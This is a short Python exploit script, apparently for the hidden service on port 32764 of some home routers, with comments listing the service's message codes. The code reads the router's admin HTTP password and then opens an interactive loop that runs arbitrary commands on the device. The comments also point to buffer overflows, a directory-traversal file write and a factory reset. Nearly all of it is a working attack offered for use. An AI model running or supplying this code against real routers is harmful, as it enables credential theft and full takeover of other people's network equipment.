import socket
import struct
import sys

HOST = '192.168.1.1'
PORT = 32764

def send_message(s, message, payload=''):
	header = struct.pack('<III', 0x53634D4D, message, len(payload))
	s.send(header+payload)
	sig, ret_val, ret_len = struct.unpack('<III', s.recv(0xC))
	assert(sig == 0x53634D4D)
	if ret_val != 0:
		return ret_val, "ERROR"
	ret_str = ""
	while len(ret_str) < ret_len:
		ret_str += s.recv(ret_len - len(ret_str))
	return ret_val, ret_str

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
send_message(s, 3, "wlan_mgr_enable=1")
print send_message(s, 2, "http_password")[1]

while 1 :
	print send_message(s, 7, sys.stdin.readline().strip('\n'))[1]

s.close()

#commands :
# 1 : get infos
# 2 : get var -> possible overflow 
# 3 : set var -> buffer overflow
# 4 : commit nvram (read nvram /dev/mtdblock/3 from /tmp/nvram and check CRC)
# 5 : bridge mode ?
#	wan_mode=bridgedonly
#	wan_encap=0
#	wan_vpi=8
#	wan_vci=81
#	/usr/bin/killall br2684ctl
#	/usr/bin/killall udhcpd
#	/usr/bin/killall -9 atm_monitor
#	/usr/sbin/rc wan stop >/dev/null 2>&1
#	/usr/sbin/atm_monitor&
# 6 : show speed
# 7 : cmd
#	special commands :
#		exit, bye, quit -> quit... (set alive to 0)
#		cd : change directory (a little bit WTF)
#   other commands :
#		integer overflow in stdout handling (?) not exploitable but still ...
#		buffer overflow (buffer de 0x10000)
# 		
# 8 : write file (file name in payload, dir : tmp, directory traversa)
# 9 : print version
#10 : print modem router ip (nvram_get(lan_ipaddr))
#11 : resaure default settings (nvram_set(restore_default, 1) / nvram_commit)
#12 : read /dev/mtdblock/0 [-4:-2]
#13 : dump nvram on disk (/tmp/nvram) and commit

